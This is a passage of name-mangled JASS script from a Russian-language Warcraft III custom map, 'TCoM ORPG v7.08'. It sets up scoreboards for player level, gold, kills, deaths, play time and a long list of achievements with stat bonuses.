call TriggerRegisterAnyUnitEventBJ(ic,EVENT_PLAYER_UNIT_SELL_ITEM)
call TriggerAddAction(ic,function B2Q)
endfunction
function B2S takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Ne=GetKillingUnit()
if IsUnitType(Hu,UNIT_TYPE_HERO) then
if IsUnitIllusion(Hu)==false then
set Ro[GetPlayerId(GetOwningPlayer(Hu))+1]=Ro[GetPlayerId(GetOwningPlayer(Hu))+1]+1
endif
endif
if GetOwningPlayer(GetTriggerUnit())==Player(PLAYER_NEUTRAL_AGGRESSIVE) then
set Rp[GetPlayerId(GetOwningPlayer(Ne))+1]=Rp[GetPlayerId(GetOwningPlayer(Ne))+1]+1
endif
set Hu=null
set Ne=null
endfunction
function B2T takes nothing returns nothing
local trigger id=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(id,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(id,function B2S)
set id=null
endfunction
function B2U takes nothing returns nothing
local integer Ht=1
call nJ(Pb,1,1,"|c00ff9696Игроки|r")
call nJ(Pb,2,1,"|c00ff7f00LVL|r")
call nJ(Pb,3,1,"|c00ffff00Gold|r")
call nJ(Pb,4,1,"|c00ff9696Метки|r")
call nJ(Pb,5,1,"|c00ffff00Наигранное время|r")
call nJ(Pb,6,1,"|c00ffff00Трофей|r")
call nJ(Pb,1,11,"|c006969ffВремя:|r")
call nI(Pb,1,11,true,true)
call nI(Pb,2,11,true,false)
call nI(Pb,3,11,true,false)
call nI(Pb,4,11,true,false)
call nI(Pb,5,11,true,false)
call nI(Pb,2,12,true,false)
call nI(Pb,3,12,true,false)
call nI(Pb,4,12,true,false)
call nI(Pb,5,12,true,false)
call nI(Pb,2,13,true,false)
call nI(Pb,3,13,true,false)
call nI(Pb,4,13,true,false)
call nJ(Pb,1,12,"|c00ff7f00Заданий выполнено:|r ")
call nJ(Pb,2,11,"00")
call nJ(Pb,3,11,":")
call nJ(Pb,4,11,"00")
call nG(Pb,1,11,5.)
call nG(Pb,2,11,1.5)
call nG(Pb,3,11,.7)
call nG(Pb,4,11,1.5)
call nG(Pb,1,12,50.)
call nG(Pb,1,13,50.)
call nJ(Pb,1,13,"|c006969ffСложность:|r "+I2S(MK))
call nH(Pb,1,11,"war3mapImported\\BTNTimeAll.blp")
call nH(Pb,1,12,"war3mapImported\\BTNQuestComplete.blp")
call nH(Pb,1,13,"war3mapImported\\BTNHardLvl.blp")
set Rq[1]=Rq[1]+1
if Rq[1]>=60 then
set Rq[1]=0
set Rq[2]=Rq[2]+1
endif
call nJ(Pb,2,11,I2S(Rq[2]))
call nJ(Pb,4,11,I2S(Rq[1]))
loop
call nJ(Pb,1,Ht+1,OD[Ht-1]+OE[Ht-1])
call nJ(Pb,1,12,"|c00ff7f00Заданий выполнено:|r "+I2S(Sf))
if MT[Ht-1]!=null then
call nJ(Pb,2,Ht+1,"|c00ff7f00"+I2S(GetUnitLevel(MT[Ht-1])))
call nJ(Pb,3,Ht+1,"|c00ffff00"+I2S(GetPlayerState(Player(Ht-1),PLAYER_STATE_RESOURCE_GOLD)))
call nJ(Pb,4,Ht+1,"|c00ff9696"+I2S(GetPlayerState(Player(Ht-1),PLAYER_STATE_RESOURCE_LUMBER)))
call nJ(Pb,5,Ht+1,I2S(GetUnitAbilityLevel(MT[Ht-1],$41496434))+"|c00ff0000д|r "+I2S(GetUnitAbilityLevel(MT[Ht-1],$41496433))+"|c00ff7f00ч|r "+I2S(GetUnitAbilityLevel(MT[Ht-1],$41496432))+"|c00ffff00м|r")
call nI(Pb,2,Ht+1,true,true)
call nI(Pb,3,Ht+1,true,true)
call nI(Pb,4,Ht+1,true,true)
call nI(Pb,5,Ht+1,true,true)
call nI(Pb,6,Ht+1,true,true)
call nH(Pb,2,Ht+1,"war3mapImported\\BTNLVLhero.blp")
call nH(Pb,3,Ht+1,"war3mapImported\\BTNGoldHero.blp")
call nH(Pb,4,Ht+1,"war3mapImported\\BTNBloodMetk.blp")
call nH(Pb,5,Ht+1,"war3mapImported\\BTNTimerHero.blp")
call nH(Pb,6,Ht+1,"war3mapImported\\BTNTrofei.blp")
else
call nI(Pb,2,Ht+1,false,false)
call nI(Pb,3,Ht+1,false,false)
call nI(Pb,4,Ht+1,false,false)
call nI(Pb,5,Ht+1,false,false)
call nI(Pb,6,Ht+1,false,false)
endif
set ga[Ht-1]=0
set Ht=Ht+1
exitwhen Ht>8
endloop
endfunction
function B2V takes nothing returns nothing
local integer Ht=1
local integer L9
loop
if Vw[Ht]==false and MT[Ht-1]!=null then
set L9=1
loop
call nG(OC[Ht],1,L9,13.)
call nG(OC[Ht],2,L9,14.)
call nG(OC[Ht],3,L9,14.)
call nH(OC[Ht],2,L9+1,"war3mapImported\\BTNBlockAchiv.blp")
call nH(OC[Ht],3,L9+1,"war3mapImported\\BTNBlockAchiv.blp")
set L9=L9+1
exitwhen L9>24
endloop
call nI(OC[Ht],1,2,false,false)
call nI(OC[Ht],2,1,true,false)
call nI(OC[Ht],3,1,true,false)
call nH(OC[Ht],1,3,"war3mapImported\\BTNLVLhero.blp")
call nH(OC[Ht],1,4,"war3mapImported\\BTNGoldHero.blp")
call nH(OC[Ht],1,5,"war3mapImported\\BTNBloodMetk.blp")
call nH(OC[Ht],1,12,"war3mapImported\\BTNExHero.blp")
call nH(OC[Ht],1,13,"war3mapImported\\BTNExHero.blp")
call nH(OC[Ht],1,14,"war3mapImported\\BTNExHero.blp")
call nH(OC[Ht],1,15,"war3mapImported\\BTNExHero.blp")
call nH(OC[Ht],1,16,"war3mapImported\\BTNExHero.blp")
call nH(OC[Ht],1,17,"war3mapImported\\BTNExHero.blp")
call nH(OC[Ht],1,8,"war3mapImported\\BTNDeathHero.blp")
call nH(OC[Ht],1,9,"war3mapImported\\BTNTarget.blp")
call nH(OC[Ht],1,6,"war3mapImported\\BTNZvanie.blp")
call nH(OC[Ht],1,7,"war3mapImported\\BTNZvanie.blp")
call nH(OC[Ht],1,10,"war3mapImported\\BTNStats.blp")
call nJ(OC[Ht],1,3,"|c00505099Уровень|r: "+I2S(GetUnitLevel(MT[Ht-1])))
call nJ(OC[Ht],1,4,"|c00ffff00Золото|r: "+I2S(GetPlayerState(Player(Ht-1),PLAYER_STATE_RESOURCE_GOLD)))
call nJ(OC[Ht],1,5,"|c00ff9696Кровавые Метки|r: "+I2S(GetPlayerState(Player(Ht-1),PLAYER_STATE_RESOURCE_LUMBER)))
call nJ(OC[Ht],1,6,"|c009696ffЗвание:")
call nJ(OC[Ht],1,7,VN[Ht])
call nJ(OC[Ht],1,8,"|c007d7d7dСмертей|r: "+I2S(Ro[Ht]))
call nJ(OC[Ht],1,9,"|c00ff0000Убийств|r: "+I2S(Rp[Ht]))
call nJ(OC[Ht],1,10,"|c0000ffffПараметры|r: "+I2S(GetHeroAgi(MT[Ht-1],true)+GetHeroStr(MT[Ht-1],true)+GetHeroInt(MT[Ht-1],true)))
call nJ(OC[Ht],1,12,"|c00ff7f00Сила|r: "+I2S(UG[Ht])+"%")
call nJ(OC[Ht],1,13,"|c006969ffРазрушение|r: "+I2S(UH[Ht])+"%")
call nJ(OC[Ht],1,14,"|c007004ccМагия|r: "+I2S(UI[Ht])+"%")
call nJ(OC[Ht],1,15,"|c0000ff00Жизнь|r: "+I2S(UJ[Ht])+"%")
call nJ(OC[Ht],1,16,"|c00865405Защита|r: "+I2S(UK[Ht])+"%")
call nJ(OC[Ht],1,17,"|c00ffff00Помощь|r: "+I2S(UM[Ht])+"%")
call nJ(OC[Ht],1,19,g7[Ht-1])
call nI(OC[Ht],1,20,true,true)
call nI(OC[Ht],1,21,true,true)
call nI(OC[Ht],1,11,false,false)
call nI(OC[Ht],1,18,false,false)
call nH(OC[Ht],1,19,"war3mapImported\\BTNTalikHero.blp")
call nH(OC[Ht],1,20,"war3mapImported\\BTNTalikHero.blp")
call nH(OC[Ht],1,21,"war3mapImported\\BTNTalikHero.blp")
call nJ(OC[Ht],1,20,g7[Ht-1+10])
call nJ(OC[Ht],1,21,g7[Ht-1+20])
call nI(OC[Ht],1,22,true,true)
call nH(OC[Ht],1,22,"war3mapImported\\BTNCourier.blp")
call nI(OC[Ht],1,23,true,true)
call nH(OC[Ht],1,23,"war3mapImported\\BTNCourier.blp")
call nJ(OC[Ht],1,22,"|c0000FF80"+GetUnitName(NL[2*Ht]))
call nJ(OC[Ht],1,23,"|c0000FF80"+hP[Ht])
if GetUnitAbilityLevel(MT[Ht-1],$41305A50)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313037)>=1 then
call nJ(OC[Ht],2,2,"|c0000ff00Я так просто не сдамся|r(|c00ffff00+10 стат|r)")
call nH(OC[Ht],2,2,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305A51)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313037)>=1 then
call nJ(OC[Ht],2,3,"|c0000ff00Праздничный настрой|r(|c00ffff00+15 стат|r)")
call nH(OC[Ht],2,3,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313038)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41305A52)>=1 then
call nJ(OC[Ht],2,4,"|c0000ff00Максимум|r(|c00ffff00+30 стат|r)")
call nH(OC[Ht],2,4,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305A53)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313043)>=1 then
call nJ(OC[Ht],2,5,"|c0000ff00Гладиатор|r(|c00ffff00+500 НР|r)")
call nH(OC[Ht],2,5,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305444)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41305557)>=1 then
call nJ(OC[Ht],2,6,"|c0000ff00Вместе веселее|r(|c00ffff00+20 стат|r)")
call nH(OC[Ht],2,6,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305052)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41305247)>=1 then
call nJ(OC[Ht],2,7,"|c0000ff00Играть, играть, играть!|r(|c00ffff00+20 стат|r)")
call nH(OC[Ht],2,7,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305A56)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313039)>=1 then
call nJ(OC[Ht],2,8,"|c0000ff00Убей их всех|r(|c00ffff00+100 атаки|r)")
call nH(OC[Ht],2,8,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305A57)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313039)>=1 then
call nJ(OC[Ht],2,9,"|c0000ff00Добытчик|r(|c00ffff00+70 атаки|r)")
call nH(OC[Ht],2,9,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305A58)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313042)>=1 then
call nJ(OC[Ht],2,10,"|c0000ff00Смерть - лишь начало|r(|c00ffff00+15 защиты|r)")
call nH(OC[Ht],2,10,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305A59)>=1 then
call nJ(OC[Ht],2,11,"|c0000ff00Деньги - зло|r(|c00ffff00+200 атаки|r)")
call nH(OC[Ht],2,11,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$4130545A)>=1 then
call nJ(OC[Ht],2,12,"|c0000ff00Знаток|r(|c00ffff00+20 стат|r)")
call nH(OC[Ht],2,12,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305A5A)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313043)>=1 then
call nJ(OC[Ht],2,13,"|c0000ff00Кровоносная Тварь|r(|c00ffff00+1000 НР|r)")
call nH(OC[Ht],2,13,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305235)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41305247)>=1 then
call nJ(OC[Ht],2,14,"|c0000ff00Стать бы гробовщиком|r(|c00ffff00+40 стат|r)")
call nH(OC[Ht],2,14,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305138)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41305557)>=1 then
call nJ(OC[Ht],2,15,"|c0000ff00Скорострел|r(|c00ffff00+20 стат|r)")
call nH(OC[Ht],2,15,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313032)>=1 then
call nJ(OC[Ht],2,16,"|c0000ff00Вождь Арахнидов|r(|c00ffff00+40 стат|r)")
call nH(OC[Ht],2,16,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313033)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313038)>=1 then
call nJ(OC[Ht],2,17,"|c0000ff00Прелестный читатель|r(|c00ffff00+25 стат|r)")
call nH(OC[Ht],2,17,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313034)>=1 then
call nJ(OC[Ht],2,18,"|c0000ff00На пути разрушения|r(|c00ffff00+100 атаки|r)")
call nH(OC[Ht],2,18,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313035)>=1 then
call nJ(OC[Ht],2,19,"|c0000ff00Сквозь воду|r(|c00ffff00+20 стат|r)")
call nH(OC[Ht],2,19,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313036)>=1 or GetUnitAbilityLevel(MT[Ht-1],$41313042)>=1 then
call nJ(OC[Ht],2,20,"|c0000ff00Растения во благо|r(|c00ffff00+10 защиты|r)")
call nH(OC[Ht],2,20,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313058)>=1 then
call nJ(OC[Ht],2,21,"|c0000ff00Новогодний корпоратив|r(|c00ffff00+99 стат|r)")
call nH(OC[Ht],2,21,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41304B4E)>=1 then
call nJ(OC[Ht],2,22,"|c0000ff00Несущий смерть|r(|c00ffff00+100 стат|r)")
call nH(OC[Ht],2,22,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41304B51)>=1 then
call nJ(OC[Ht],2,23,"|c0000ff00Всезнающий|r(|c00ffff00+80 стат|r)")
call nH(OC[Ht],2,23,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41304C4B)>=1 then
call nJ(OC[Ht],3,2,"|c0000ff00Свиточек|r(|c00ffff00+10 стат|r)")
call nH(OC[Ht],3,2,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41305556)>=1 then
call nJ(OC[Ht],3,3,"|c0000ff00Проклятый|r(|c00ffff00+15 стат|r)")
call nH(OC[Ht],3,3,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313733)>=1 then
call nJ(OC[Ht],3,4,"|c0000ff00Каменный|r(|c00ffff00+25 стат|r)")
call nH(OC[Ht],3,4,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$4131354C)>=1 then
call nJ(OC[Ht],3,5,"|c0000ff00Целитель|r(|c00ffff00+20 стат|r)")
call nH(OC[Ht],3,5,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41314149)>=1 then
call nJ(OC[Ht],3,6,"|c0000ff00Ловкость|r(|c00ffff00+30 стат|r)")
call nH(OC[Ht],3,6,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$4131414A)>=1 then
call nJ(OC[Ht],3,7,"|c0000ff00Неуловимый|r(|c00ffff00+50 стат|r)")
call nH(OC[Ht],3,7,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41314431)>=1 then
call nJ(OC[Ht],3,8,"|c0000ff00Нас не оглушить!|r(|c00ffff00+50 стат|r)")
call nH(OC[Ht],3,8,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41314430)>=1 then
call nJ(OC[Ht],3,9,"|c0000ff00Магия? Не, не слышали|r(|c00ffff00+50 стат|r)")
call nH(OC[Ht],3,9,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41314450)>=1 then
call nJ(OC[Ht],3,10,"|c0000ff00Ниндзя|r(|c00ffff00+60 стат|r)")
call nH(OC[Ht],3,10,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41314451)>=1 then
call nJ(OC[Ht],3,11,"|c0000ff00Звёздочет|r(|c00ffff00+60 стат|r)")
call nH(OC[Ht],3,11,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$4131424E)>=1 then
call nJ(OC[Ht],3,12,"|c0000ff00Море по колено|r(|c00ffff00+77 стат|r)")
call nH(OC[Ht],3,12,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313141)>=1 then
call nJ(OC[Ht],3,13,"|c0000ff00Повелитель снега|r(|c00ffff00+133 стат|r)")
call nH(OC[Ht],3,13,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41304736)>=1 then
call nJ(OC[Ht],3,14,"|c0000ff00Коллекционер|r(|c00ffff00+82 стат|r)")
call nH(OC[Ht],3,14,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41304D4A)>=1 then
call nJ(OC[Ht],3,15,"|c0000ff00Мы незахлебнёмся|r(|c00ffff00+155 стат|r)")
call nH(OC[Ht],3,15,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41314254)>=1 then
call nJ(OC[Ht],3,16,"|c0000ff00Сон для слабых|r(|c00ffff00+103 стат|r)")
call nH(OC[Ht],3,16,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41304D44)>=1 then
call nJ(OC[Ht],3,17,"|c0000ff00Рассечь!|r(|c00ffff00+55 стат|r)")
call nH(OC[Ht],3,17,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313745)>=1 then
call nJ(OC[Ht],3,18,"|c0000ff00Темный ветер|r(|c00ffff00+55 стат|r)")
call nH(OC[Ht],3,18,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313746)>=1 then
call nJ(OC[Ht],3,19,"|c0000ff00Возмездие|r(|c00ffff00+55 стат|r)")
call nH(OC[Ht],3,19,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313747)>=1 then
call nJ(OC[Ht],3,20,"|c0000ff00Неприкаянный|r(|c00ffff00+55 стат|r)")
call nH(OC[Ht],3,20,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
if GetUnitAbilityLevel(MT[Ht-1],$41313954)>=1 then
call nJ(OC[Ht],3,21,"|c0000ff00Повелитель песка|r(|c00ffff00+144 стат|r)")
call nH(OC[Ht],3,21,"war3mapImported\\BTNUnBlockAchiv.blp")
endif
endif
call TriggerSleepAction(.1)
set Ht=Ht+1
exitwhen Ht>8
endloop
endfunction
function B2W takes nothing returns nothing
local integer L9
local trigger Hc
set L9=1
loop
set OC[L9]=nF(3,23,"Ваша Статистика")
call nJ(OC[L9],1,1,"|c00ff7f00"+GetPlayerName(Player(L9-1)))
call nJ(OC[L9],1,19,"|c007d7d7dНет талисмана|r")
call nJ(OC[L9],2,1,"|c006969ffДостижения|r")
call nJ(OC[L9],2,2,"[1]|c007d7d7dЯ так просто не сдамся|r")
call nJ(OC[L9],2,3,"[2]|c007d7d7dПраздничный настрой|r")
call nJ(OC[L9],2,4,"[3]|c007d7d7dМаксимум|r")
call nJ(OC[L9],2,5,"[4]|c007d7d7dГладиатор|r")
call nJ(OC[L9],2,6,"[5]|c007d7d7dВместе веселее|r")
call nJ(OC[L9],2,7,"[6]|c007d7d7dИграть, играть, играть!|r")
call nJ(OC[L9],2,8,"[7]|c007d7d7dУбей их всех|r")
call nJ(OC[L9],2,9,"[8]|c007d7d7dДобытчик|r")
call nJ(OC[L9],2,10,"[9]|c007d7d7dСмерть - лишь начало|r")
call nJ(OC[L9],2,11,"[10]|c007d7d7dДеньги - зло|r")
call nJ(OC[L9],2,12,"[11]|c007d7d7dЗнаток|r")
call nJ(OC[L9],2,13,"[12]|c007d7d7dКровоносная Тварь|r")
call nJ(OC[L9],2,14,"[13]|c007d7d7dСтать бы гробовщиком|r")
call nJ(OC[L9],2,15,"[14]|c007d7d7dСкорострел|r")
call nJ(OC[L9],2,16,"[15]|c007d7d7dВождь Арахнидов|r")
call nJ(OC[L9],2,17,"[16]|c007d7d7dПрелестный читатель|r")
call nJ(OC[L9],2,18,"[17]|c007d7d7dНа пути разрушения|r")
call nJ(OC[L9],2,19,"[18]|c007d7d7dСквозь воду|r")
call nJ(OC[L9],2,20,"[19]|c007d7d7dРастения во благо|r")
call nJ(OC[L9],2,21,"[20]|c007d7d7dНовогодний корпоратив|r")
call nJ(OC[L9],2,22,"[21]|c007d7d7dНесущий смерть|r")
call nJ(OC[L9],2,23,"[22]|c007d7d7dВсезнающий|r")
call nJ(OC[L9],3,2,"[23]|c007d7d7dСвиточек|r")
call nJ(OC[L9],3,3,"[24]|c007d7d7dПроклятый|r")
call nJ(OC[L9],3,4,"[25]|c007d7d7dКаменный|r")
call nJ(OC[L9],3,5,"[26]|c007d7d7dЦелитель|r")
call nJ(OC[L9],3,6,"[27]|c007d7d7dЛовкость|r")
call nJ(OC[L9],3,7,"[28]|c007d7d7dНеуловимый|r")
call nJ(OC[L9],3,8,"[29]|c007d7d7dНас не оглушить!|r")
call nJ(OC[L9],3,9,"[30]|c007d7d7dМагия? Не, не слышали|r")
call nJ(OC[L9],3,10,"[31]|c007d7d7dНиндзя|r")
call nJ(OC[L9],3,11,"[32]|c007d7d7dЗвёздочет|r")
call nJ(OC[L9],3,12,"[33]|c007d7d7dМоре по колено|r")
call nJ(OC[L9],3,13,"[34]|c007d7d7dПовелитель снега|r")
call nJ(OC[L9],3,14,"[35]|c007d7d7dКоллекционер|r")
call nJ(OC[L9],3,15,"[36]|c007d7d7dМы не захлебнёмся|r")
call nJ(OC[L9],3,16,"[37]|c007d7d7dСон для слабых|r")
call nJ(OC[L9],3,17,"[38]|c007d7d7dРассечь!|r")
call nJ(OC[L9],3,18,"[39]|c007d7d7dТемный ветер|r")
call nJ(OC[L9],3,19,"[40]|c007d7d7dВозмездие|r")
call nJ(OC[L9],3,20,"[41]|c007d7d7dНеприкаянный|r")
call nJ(OC[L9],3,21,"[42]|c007d7d7dПовелитель песка|r")
set L9=L9+1
exitwhen L9>8
endloop
set Hc=CreateTrigger()
call TriggerRegisterTimerEvent(Hc,1.,true)
call TriggerAddAction(Hc,function B2V)
set Hc=null
set Vw[1]=true
set Vw[2]=true
set Vw[3]=true
set Vw[4]=true
set Vw[5]=true
set Vw[6]=true
set Vw[7]=true
set Vw[8]=true
endfunction
function B2X takes nothing returns nothing
local integer NX=1
local trigger Hc
set Pb=nF(6,13,"TCoM ORPG v7.08")
set OC[10]=nF(3,21,"Статистика боя")
loop
call nG(Pb,1,NX,8.)
call nG(Pb,2,NX,3.)
call nG(Pb,3,NX,6.)
call nG(Pb,4,NX,6.)
call nG(Pb,5,NX,9.)
call nG(Pb,6,NX,10.)
call nI(Pb,1,NX,true,false)
call nI(Pb,2,NX,true,false)
call nI(Pb,3,NX,true,false)
call nI(Pb,4,NX,true,false)
call nI(Pb,5,NX,true,false)
call nI(Pb,6,NX,true,false)
call nI(OC[10],1,NX,true,false)
call nI(OC[10],2,NX,true,false)
call nI(OC[10],3,NX,true,false)
call nG(OC[10],3,NX,3)
call nI(OC[10],1,10+NX,true,false)
call nI(OC[10],2,10+NX,true,false)
call nI(OC[10],3,10+NX,true,false)
call nI(Pb,2,1,true,true)
call nI(Pb,3,1,true,true)
call nI(Pb,4,1,true,true)
call nI(Pb,5,1,true,true)
call nI(Pb,6,1,true,true)
call nH(Pb,2,1,"war3mapImported\\BTNLVLhero.blp")
call nH(Pb,3,1,"war3mapImported\\BTNGoldHero.blp")
call nH(Pb,4,1,"war3mapImported\\BTNBloodMetk.blp")
call nH(Pb,5,1,"war3mapImported\\BTNTimerHero.blp")
call nH(Pb,6,1,"war3mapImported\\BTNTrofei.blp")
set NX=NX+1
exitwhen NX>11
endloop
call MultiboardDisplay(Pb,true)
set Hc=CreateTrigger()
call TriggerRegisterTimerEvent(Hc,1.,true)
call TriggerAddAction(Hc,function B2U)
set Hc=null
call nG(OC[10],1,1,8.)
call nG(OC[10],1,2,8.)
call nG(OC[10],2,1,15.)
call nG(OC[10],2,2,8.)
call nJ(OC[10],1,1,"|c00ffff00Босс|r: ")
call nJ(OC[10],1,2,"|c00ff9696Общий урон|r: ")
call nJ(OC[10],1,12,"|c00ff9696Дроп|r: ")
call nI(OC[10],1,3,false,false)
call nI(OC[10],2,3,false,false)
call nI(OC[10],3,3,false,false)
call nI(OC[10],1,11,true,false)
call nI(OC[10],2,11,false,false)
call nI(OC[10],3,11,false,false)
call nI(OC[10],2,1,true,true)
call nI(OC[10],2,2,true,true)
call nH(OC[10],2,1,"war3mapImported\\BTNTarget.blp")
call nH(OC[10],2,2,"war3mapImported\\BTNHP.blp")
endfunction
function B2Y takes nothing returns nothing
local unit ip=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(ip))+1
if GetUnitTypeId(ip)==$48303033 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNcenarius.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNcenarius.blp")
elseif GetUnitTypeId(ip)==$48303344 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTN24.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTN24.blp")
elseif GetUnitTypeId(ip)==$48303550 or GetUnitTypeId(ip)==$48303730 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTN429.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTN429.blp")
elseif GetUnitTypeId(ip)==$48303147 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNInfernal.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNInfernal.blp")
elseif GetUnitTypeId(ip)==$48303437 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNNagaMyrmidon.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNNagaMyrmidon.blp")
elseif GetUnitTypeId(ip)==$48303738 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNLichKing.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNLichKing.blp")
elseif GetUnitTypeId(ip)==$48303534 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTN93894-96b7d71a1b4cbb9ce64a90518f6139932.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTN93894-96b7d71a1b4cbb9ce64a90518f6139932.blp")
elseif GetUnitTypeId(ip)==$48303032 or GetUnitTypeId(ip)==$48303655 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNability6 (13).blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNability6 (13).blp")
elseif GetUnitTypeId(ip)==$48303443 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNHeroMagni.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNHeroMagni.blp")
elseif GetUnitTypeId(ip)==$48303046 or GetUnitTypeId(ip)==$48303653 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
